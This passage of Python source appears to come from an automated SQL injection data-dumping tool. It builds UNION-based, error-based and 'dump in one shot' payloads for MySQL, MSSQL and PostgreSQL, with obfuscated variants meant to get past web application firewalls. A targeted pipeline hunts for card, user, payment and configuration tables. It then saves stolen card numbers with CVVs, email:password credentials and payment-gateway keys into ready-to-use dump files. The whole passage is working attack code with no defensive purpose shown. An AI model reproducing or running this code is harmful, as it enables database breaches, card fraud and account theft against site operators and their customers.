        logger.info(f"Enumerated {len(columns)} columns from table '{table}'")
        return columns

    async def extract_data(self, sqli: SQLiResult, table: str, columns: List[str],
                           session: aiohttp.ClientSession, limit: int = None) -> List[Dict]:
        """Extract actual data from a table using union injection.
        
        Args:
            sqli: SQLi vulnerability result
            table: Table to extract from
            columns: Columns to extract
            session: aiohttp session
            limit: Max rows to extract
            
        Returns:
            List of row dictionaries
        """
        if limit is None:
            limit = self.max_rows
        
        rows = []
        scanner = self.scanner
        base, params = scanner._parse_url(sqli.url)
        original = params[sqli.parameter][0] if isinstance(params[sqli.parameter], list) else params[sqli.parameter]
        
        if sqli.injection_type != "union" or not sqli.injectable_columns:
            return rows
        
        col_idx = sqli.injectable_columns[0]
        null_list = ["NULL"] * sqli.column_count
        
        # Build CONCAT expression for all target columns
        separator = "0x7c7c"  # ||
        row_separator = "0x3c62723e"  # <br>
        
        marker_start = f"{random.randint(100000, 999999)}"
        marker_end = f"{random.randint(100000, 999999)}"
        
        if sqli.dbms in ("mysql", ""):
            concat_cols = ",".join([f"IFNULL({c},'NULL')" for c in columns])
            
            for offset in range(0, limit, 20):
                null_list_copy = null_list.copy()
                null_list_copy[col_idx] = (
                    f"CONCAT(0x{marker_start},"
                    f"GROUP_CONCAT(CONCAT_WS({separator},{concat_cols}) SEPARATOR {row_separator}),"
                    f"0x{marker_end})"
                )
                
                query = (
                    f"' UNION ALL SELECT {','.join(null_list_copy)} "
                    f"FROM {table} LIMIT {offset},20-- -"
                )
                
                test_params = params.copy()
                test_params[sqli.parameter] = [f"{original}{query}"]
                test_url = scanner._build_url(base, test_params)
                
                body, _ = await scanner._fetch(test_url, session)
                if not body:
                    break
                
                match = re.search(rf'{marker_start}(.+?){marker_end}', body, re.S)
                if not match:
                    break
                
                raw_rows = match.group(1).split("<br>")
                batch_count = 0
                for raw_row in raw_rows:
                    if not raw_row.strip():
                        continue
                    values = raw_row.split("||")
                    if len(values) == len(columns):
                        row = {columns[i]: values[i] for i in range(len(columns))}
                        rows.append(row)
                        batch_count += 1
                
                if batch_count < 20:
                    break  # No more rows
        
        elif sqli.dbms == "mssql":
            # MSSQL: Use FOR XML PATH
            concat_cols = "+CHAR(124)+CHAR(124)+".join([f"ISNULL(CAST({c} AS VARCHAR(MAX)),'NULL')" for c in columns])
            
            null_list_copy = null_list.copy()
            null_list_copy[col_idx] = (
                f"STUFF((SELECT TOP {limit} CHAR(60)+CHAR(98)+CHAR(114)+CHAR(62)+"
                f"{concat_cols} FROM {table} FOR XML PATH('')),1,0,'')"
            )
            
            query = f"' UNION ALL SELECT {','.join(null_list_copy)}-- -"
            test_params = params.copy()
            test_params[sqli.parameter] = [f"{original}{query}"]
            test_url = scanner._build_url(base, test_params)
            
            body, _ = await scanner._fetch(test_url, session)
            if body:
                for raw_row in re.findall(r'<br>(.+?)(?=<br>|$)', body):
                    values = raw_row.split("||")
                    if len(values) == len(columns):
                        row = {columns[i]: values[i] for i in range(len(columns))}
                        rows.append(row)
        
        logger.info(f"Extracted {len(rows)} rows from {table} ({', '.join(columns[:5])}...)")
        return rows

    async def extract_data_error_based(self, sqli: SQLiResult, table: str, columns: List[str],
                                        session: aiohttp.ClientSession, limit: int = None) -> List[Dict]:
        """Extract data using error-based injection (fallback when UNION fails).
        
        Uses EXTRACTVALUE/UPDATEXML for MySQL, CONVERT for MSSQL, CAST for PostgreSQL.
        Extracts one row at a time via error messages.
        
        Args:
            sqli: SQLi vulnerability result
            table: Table to extract from
            columns: Columns to extract
            session: aiohttp session
            limit: Max rows to extract
            
        Returns:
            List of row dictionaries
        """
        if limit is None:
            limit = min(self.max_rows, 50)  # Error-based is slower, cap at 50
        
        rows = []
        scanner = self.scanner
        base, params = scanner._parse_url(sqli.url)
        original = params[sqli.parameter][0] if isinstance(params[sqli.parameter], list) else params[sqli.parameter]
        
        separator = "0x7c7c"  # ||
        
        for offset in range(limit):
            row_data = {}
            
            if sqli.dbms in ("mysql", ""):
                # MySQL: EXTRACTVALUE / UPDATEXML error-based extraction
                concat_cols = ",".join([f"IFNULL({c},'N')" for c in columns])
                
                # Try EXTRACTVALUE first  
                payloads = [
                    f"' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT CONCAT_WS({separator},{concat_cols}) FROM {table} LIMIT {offset},1),0x7e))-- -",
                    f"' AND UPDATEXML(1,CONCAT(0x7e,(SELECT CONCAT_WS({separator},{concat_cols}) FROM {table} LIMIT {offset},1),0x7e),1)-- -",
                    f"' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT CONCAT_WS({separator},{concat_cols}) FROM {table} LIMIT {offset},1),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -",
                ]
                
                for payload in payloads:
                    test_params = params.copy()
                    test_params[sqli.parameter] = [f"{original}{payload}"]
                    test_url = scanner._build_url(base, test_params)
                    
                    body, _ = await scanner._fetch(test_url, session)
                    if not body:
                        continue
                    
                    # Extract data from error message: ~DATA~ or 'DATA' in error
                    match = re.search(r"XPATH syntax error:\s*'~([^~]+)~'", body)
                    if not match:
                        match = re.search(r"Duplicate entry '([^']+)' for key", body)
                    if not match:
                        match = re.search(r"~([^~]{3,})~", body)
                    
                    if match:
                        raw = match.group(1)
                        values = raw.split("||")
                        if len(values) == len(columns):
                            row_data = {columns[i]: values[i] for i in range(len(columns))}
                        elif len(values) > 0:
                            # Partial match — take what we can
                            for i, val in enumerate(values):
                                if i < len(columns):
                                    row_data[columns[i]] = val
                        break  # Got data from this payload
            
            elif sqli.dbms == "mssql":
                # MSSQL: CONVERT error-based extraction
                concat_cols = "+CHAR(124)+CHAR(124)+".join([f"ISNULL(CAST({c} AS VARCHAR(MAX)),'N')" for c in columns])
                
                payloads = [
                    f"' AND 1=CONVERT(INT,(SELECT TOP 1 {concat_cols} FROM (SELECT TOP {offset + 1} * FROM {table} ORDER BY 1) sub ORDER BY 1 DESC))-- -",
                    f"' AND 1=(SELECT TOP 1 CAST({concat_cols} AS INT) FROM {table})-- -",
                ]
                
                for payload in payloads:
                    test_params = params.copy()
                    test_params[sqli.parameter] = [f"{original}{payload}"]
                    test_url = scanner._build_url(base, test_params)
                    
                    body, _ = await scanner._fetch(test_url, session)
                    if not body:
                        continue
                    
                    # MSSQL error: "Conversion failed when converting the nvarchar value 'DATA' to data type int"
                    match = re.search(r"converting the (?:n?varchar|ntext) value '([^']+)'", body, re.I)
                    if not match:
                        match = re.search(r"cannot convert .+? value '([^']+)'", body, re.I)
                    
                    if match:
                        raw = match.group(1)
                        values = raw.split("||")
                        if len(values) == len(columns):
                            row_data = {columns[i]: values[i] for i in range(len(columns))}
                        break
            
            elif sqli.dbms == "postgresql":
                # PostgreSQL: CAST error-based extraction
                concat_cols = "||'||'||".join([f"COALESCE(CAST({c} AS TEXT),'N')" for c in columns])
                
                payload = f"' AND 1=CAST((SELECT {concat_cols} FROM {table} LIMIT 1 OFFSET {offset}) AS INT)-- -"
                
                test_params = params.copy()
                test_params[sqli.parameter] = [f"{original}{payload}"]
                test_url = scanner._build_url(base, test_params)
                
                body, _ = await scanner._fetch(test_url, session)
                if body:
                    # PostgreSQL error: "invalid input syntax for integer: \"DATA\""
                    match = re.search(r'invalid input syntax for (?:type )?integer:\s*["\']([^"\']+)', body, re.I)
                    if match:
                        raw = match.group(1)
                        values = raw.split("||")
                        if len(values) == len(columns):
                            row_data = {columns[i]: values[i] for i in range(len(columns))}
            
            if row_data:
                rows.append(row_data)
            else:
                # No more data or technique doesn't work
                if offset == 0:
                    logger.debug(f"Error-based extraction failed for {table}")
                break
            
            await asyncio.sleep(0.3)  # Rate limiting for error-based
        
        if rows:
            logger.info(f"Error-based: Extracted {len(rows)} rows from {table}")
        return rows

    async def dios_dump(self, sqli: SQLiResult, 
                        session: aiohttp.ClientSession) -> Optional[str]:
        """Perform DIOS (Dump In One Shot) extraction.
        
        Gets complete schema (all tables and columns) in a single query.
        
        Args:
            sqli: SQLi vulnerability result
            session: aiohttp session
            
        Returns:
            Raw DIOS output string, or None
        """
        if sqli.injection_type != "union" or not sqli.injectable_columns:
            return None
        
        scanner = self.scanner
        base, params = scanner._parse_url(sqli.url)
        original = params[sqli.parameter][0] if isinstance(params[sqli.parameter], list) else params[sqli.parameter]
        
        col_idx = sqli.injectable_columns[0]
        null_list = ["NULL"] * sqli.column_count
        
        dios_query = self.DIOS_QUERIES.get(sqli.dbms or "mysql")
        if not dios_query:
            return None
        
        marker_start = f"{random.randint(100000, 999999)}"
        marker_end = f"{random.randint(100000, 999999)}"
        
        null_list_copy = null_list.copy()
        null_list_copy[col_idx] = f"CONCAT(0x{marker_start},{dios_query},0x{marker_end})"
        
        query = f"' UNION ALL SELECT {','.join(null_list_copy)}-- -"
        test_params = params.copy()
        test_params[sqli.parameter] = [f"{original}{query}"]
        test_url = scanner._build_url(base, test_params)
        
        body, _ = await scanner._fetch(test_url, session)
        if body:
            match = re.search(rf'{marker_start}(.+?){marker_end}', body, re.S)
            if match:
                raw = match.group(1)
                logger.info(f"DIOS dump successful, {len(raw)} chars extracted")
                return raw
        
        return None

    async def dios_dump_waf_bypass(self, sqli: SQLiResult, 
                                    session: aiohttp.ClientSession) -> Optional[str]:
        """Perform DIOS with WAF bypass obfuscation (SQLi Dumper techniques).
        
        Tries multiple bypass variants:
        - Mixed case keywords
        - Inline comment obfuscation  
        - URL encoded comments
        - MySQL version comments
        
        Args:
            sqli: SQLi vulnerability result
            session: aiohttp session
            
        Returns:
            Raw DIOS output string, or None
        """
        if sqli.injection_type != "union" or not sqli.injectable_columns:
            return None
        
        scanner = self.scanner
        base, params = scanner._parse_url(sqli.url)
        original = params[sqli.parameter][0] if isinstance(params[sqli.parameter], list) else params[sqli.parameter]
        
        col_idx = sqli.injectable_columns[0]
        null_list = ["nUlL"] * sqli.column_count  # Mixed case NULL for WAF bypass
        
        # Get WAF bypass DIOS queries for this DBMS
        dbms = sqli.dbms or "mysql"
        bypass_queries = self.WAF_BYPASS_DIOS.get(dbms, self.WAF_BYPASS_DIOS.get("mysql", []))
        
        marker_start = f"{random.randint(100000, 999999)}"
        marker_end = f"{random.randint(100000, 999999)}"
        
        for dios_query in bypass_queries:
            null_list_copy = null_list.copy()
            null_list_copy[col_idx] = f"cOnCaT(0x{marker_start},{dios_query},0x{marker_end})"
            
            # Use obfuscated UNION
            query = f"'/**/uNiOn/**/aLl/**/sElEcT/**/{','.join(null_list_copy)}-- -"
            test_params = params.copy()
            test_params[sqli.parameter] = [f"{original}{query}"]
            test_url = scanner._build_url(base, test_params)
            
            body, _ = await scanner._fetch(test_url, session)
            if body:
                match = re.search(rf'{marker_start}(.+?){marker_end}', body, re.S)
                if match:
                    raw = match.group(1)
                    logger.info(f"WAF bypass DIOS successful, {len(raw)} chars extracted")
                    return raw
            
            # Try numeric injection variant
            query = f"999999.9/**/uNiOn/**/aLl/**/sElEcT/**/{','.join(null_list_copy)}-- -"
            test_params[sqli.parameter] = [query]
            test_url = scanner._build_url(base, test_params)
            
            body, _ = await scanner._fetch(test_url, session)
            if body:
                match = re.search(rf'{marker_start}(.+?){marker_end}', body, re.S)
                if match:
                    raw = match.group(1)
                    logger.info(f"WAF bypass DIOS (numeric) successful, {len(raw)} chars extracted")
                    return raw
        
        return None

    async def extract_with_schema_queries(self, sqli: SQLiResult,
                                           session: aiohttp.ClientSession) -> List[str]:
        """Extract tables using multi-DBMS schema queries with obfuscation.
        
        Uses database-specific queries with WAF bypass patterns.
        
        Args:
            sqli: SQLi vulnerability result
            session: aiohttp session
            
        Returns:
            List of table names
        """
        tables = []
        scanner = self.scanner
        base, params = scanner._parse_url(sqli.url)
        original = params[sqli.parameter][0] if isinstance(params[sqli.parameter], list) else params[sqli.parameter]
        
        if sqli.injection_type != "union" or not sqli.injectable_columns:
            return tables
        
        dbms = sqli.dbms or "mysql"
        schema = self.SCHEMA_QUERIES.get(dbms, self.SCHEMA_QUERIES.get("mysql"))
        
        col_idx = sqli.injectable_columns[0]
        null_list = ["nUlL"] * sqli.column_count
        
        marker_start = f"{random.randint(100000, 999999)}"
        marker_end = f"{random.randint(100000, 999999)}"
        
        # Get table names query
        tables_query = schema.get("tables", "")
        if "{db}" in tables_query:
            tables_query = tables_query.replace("{db}", schema.get("current_db", "database()"))
        
        # Build union with obfuscation
        null_list_copy = null_list.copy()
        null_list_copy[col_idx] = f"cOnCaT(0x{marker_start},gRoUp_cOnCaT(tAbLe_nAmE),0x{marker_end})"
        
        query = f"'/**/uNiOn/**/aLl/**/sElEcT/**/{','.join(null_list_copy)}/**/fRoM/**/iNfOrMaTiOn_sChEmA.tAbLeS/**/wHeRe/**/tAbLe_sChEmA=dAtAbAsE()-- -"
        test_params = params.copy()
        test_params[sqli.parameter] = [f"{original}{query}"]
        test_url = scanner._build_url(base, test_params)
        
        body, _ = await scanner._fetch(test_url, session)
        if body:
            match = re.search(rf'{marker_start}(.+?){marker_end}', body, re.S)
            if match:
                raw = match.group(1)
                tables = [t.strip() for t in raw.split(",") if t.strip()]
                logger.info(f"Extracted {len(tables)} tables with WAF bypass schema query")
        
        return tables

    async def targeted_dump(self, sqli: SQLiResult,
                            session: aiohttp.ClientSession) -> DumpedData:
        """Perform targeted data extraction focusing on high-value tables.
        
        Pipeline:
        1. Enumerate all tables
        2. Filter to high-value targets (cards, users, payments, config)
        3. Enumerate columns for target tables
        4. Extract data from columns matching whitelist
        5. Categorize extracted data
        
        Args:
            sqli: SQLi vulnerability result
            session: aiohttp session
            
        Returns:
            DumpedData with categorized findings
        """
        dump = DumpedData(
            url=sqli.url,
            dbms=sqli.dbms or "unknown",
            database=sqli.current_db or "",
        )
        
        # Step 1: Enumerate tables
        all_tables = await self.enumerate_tables(sqli, session)
        if not all_tables:
            logger.warning(f"No tables found for {sqli.url}")
            return dump
        
        # Step 2: Filter to high-value targets
        target_tables = [t for t in all_tables if self._is_target_table(t)]
        if not target_tables:
            # If no obvious targets, try first 10 tables
            target_tables = all_tables[:10]
            logger.info(f"No high-value tables matched, checking first {len(target_tables)}")
        else:
            logger.info(f"Found {len(target_tables)} high-value tables: {target_tables}")
        
        # Step 3+4: Enumerate columns and extract data for each target table
        for table in target_tables:
            columns = await self.enumerate_columns(sqli, table, session)
            if not columns:
                continue
            
            dump.tables[table] = columns
            
            # Filter to high-value columns
            target_cols = []
            for col in columns:
                if self._is_target_column(col):
                    target_cols.append(col)
            
            # If no specific targets, take all columns (might have non-obvious names)
            extract_cols = target_cols if target_cols else columns[:15]
            
            # Extract data — try UNION first, fall back to error-based
            rows = await self.extract_data(sqli, table, extract_cols, session)
            if not rows:
                # UNION failed — try error-based extraction
                logger.info(f"UNION extraction failed for {table}, trying error-based...")
                rows = await self.extract_data_error_based(sqli, table, extract_cols, session)
            if rows:
                dump.data[table] = rows
                
                # Categorize each row
                for row in rows:
                    categorized = self._categorize_row(row)
                    dump.card_data.extend(categorized["card_data"])
                    dump.credentials.extend(categorized["credentials"])
                    dump.gateway_keys.extend(categorized["gateway_keys"])
            
            # Small delay between tables
            await asyncio.sleep(0.5)
        
        # Step 5: Try DIOS dump as backup
        dios_raw = await self.dios_dump(sqli, session)
        
        # Try WAF bypass DIOS if standard failed
        if not dios_raw:
            logger.info("Standard DIOS failed, trying WAF bypass variants...")
            dios_raw = await self.dios_dump_waf_bypass(sqli, session)
        
        if dios_raw:
            dump.raw_dumps.append(dios_raw)
            
            # Parse DIOS output for table::column pairs
            for match in re.finditer(r'<br>(\w+)::(\w+)', dios_raw):
                table, column = match.group(1), match.group(2)
                if table not in dump.tables:
                    dump.tables[table] = []
                if column not in dump.tables[table]:
                    dump.tables[table].append(column)
        
        logger.info(f"Targeted dump complete for {sqli.url}: "
                    f"{len(dump.card_data)} card entries, "
                    f"{len(dump.credentials)} credentials, "
                    f"{len(dump.gateway_keys)} gateway keys, "
                    f"{dump.total_rows} total rows")
        
        return dump

    def save_dump(self, dump: DumpedData, prefix: str = "") -> Dict[str, str]:
        """Save dumped data to files.
        
        Args:
            dump: DumpedData to save
            prefix: Optional filename prefix
            
        Returns:
            Dict of {type: filepath} for saved files
        """
        saved = {}
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        domain = re.sub(r'[^\w]', '_', dump.url.split("/")[2] if "/" in dump.url else "unknown")
        base_name = f"{prefix}{domain}_{timestamp}" if prefix else f"{domain}_{timestamp}"
        
        # Save card data (JSON format)
        if dump.card_data:
            filepath = os.path.join(self.output_dir, f"{base_name}_cards.json")
            with open(filepath, "w") as f:
                json.dump({
                    "source": dump.url,
                    "dbms": dump.dbms,
                    "database": dump.database,
                    "timestamp": dump.timestamp,
                    "count": len(dump.card_data),
                    "data": dump.card_data,
                }, f, indent=2)
            saved["cards"] = filepath
            logger.info(f"💳 Saved {len(dump.card_data)} card entries to {filepath}")
            
            # ALSO save in SQLi Dumper format: PAN|EXP|CVV|HOLDER|ADDR|CITY|STATE|ZIP|COUNTRY
            txt_filepath = os.path.join(self.output_dir, f"{base_name}_cards.txt")
            with open(txt_filepath, "w") as f:
                f.write(f"# Card dump from {dump.url}\n")
                f.write(f"# Database: {dump.database} ({dump.dbms})\n")
                f.write(f"# Timestamp: {dump.timestamp}\n")
                f.write(f"# Format: PAN|EXP|CVV|HOLDER|ADDRESS|CITY|STATE|ZIP|COUNTRY\n")
                f.write("# " + "="*60 + "\n\n")
                
                for card in dump.card_data:
                    formatted = self.format_card_for_dump(card)
                    card_type = card.get("_card_type", card.get("card_type", ""))
                    if card_type:
                        f.write(f"# Type: {card_type}\n")
                    f.write(f"{formatted}\n\n")
            
            saved["cards_txt"] = txt_filepath
            logger.info(f"💳 Saved cards in SQLi Dumper format to {txt_filepath}")
        
        # Save credentials
        if dump.credentials:
            filepath = os.path.join(self.output_dir, f"{base_name}_creds.json")
            with open(filepath, "w") as f:
                json.dump({
                    "source": dump.url,
                    "dbms": dump.dbms,
                    "database": dump.database,
                    "timestamp": dump.timestamp,
                    "count": len(dump.credentials),
                    "data": dump.credentials,
                }, f, indent=2)
            saved["credentials"] = filepath
            
            # Also save in email:pass format
            txt_filepath = os.path.join(self.output_dir, f"{base_name}_creds.txt")
            with open(txt_filepath, "w") as f:
                f.write(f"# Credentials from {dump.url}\n")
                f.write(f"# Format: email:password or username:password\n\n")
                for cred in dump.credentials:
                    email = cred.get("email", cred.get("username", cred.get("user", "")))
                    password = cred.get("password", cred.get("passwd", cred.get("pass", "")))
                    if email and password:
                        f.write(f"{email}:{password}\n")
            saved["creds_txt"] = txt_filepath
        
        # Save gateway keys
        if dump.gateway_keys:
            filepath = os.path.join(self.output_dir, f"{base_name}_keys.json")
            with open(filepath, "w") as f:
                json.dump({
                    "source": dump.url,
                    "dbms": dump.dbms,
                    "database": dump.database,
                    "timestamp": dump.timestamp,
                    "count": len(dump.gateway_keys),
                    "data": dump.gateway_keys,
                }, f, indent=2)
            saved["gateway_keys"] = filepath
        
        # Save all data as CSV
        if dump.data:
            filepath = os.path.join(self.output_dir, f"{base_name}_full.csv")
            with open(filepath, "w", newline="") as f:
                writer = None
                for table, rows in dump.data.items():
                    for row in rows:
                        row_with_table = {"_table": table, **row}
                        if writer is None:
                            writer = csv.DictWriter(f, fieldnames=row_with_table.keys())
                            writer.writeheader()
                        writer.writerow(row_with_table)
            saved["full_csv"] = filepath
        
        # Save raw DIOS dump
        if dump.raw_dumps:
            filepath = os.path.join(self.output_dir, f"{base_name}_dios.txt")
            with open(filepath, "w") as f:
                f.write("\n\n---\n\n".join(dump.raw_dumps))
            saved["dios"] = filepath
        
        # Save schema
        if dump.tables:
            filepath = os.path.join(self.output_dir, f"{base_name}_schema.json")
            with open(filepath, "w") as f:
                json.dump({
                    "source": dump.url,
                    "dbms": dump.dbms,
                    "database": dump.database,
                    "tables": dump.tables,
                }, f, indent=2)
            saved["schema"] = filepath
        
        return saved
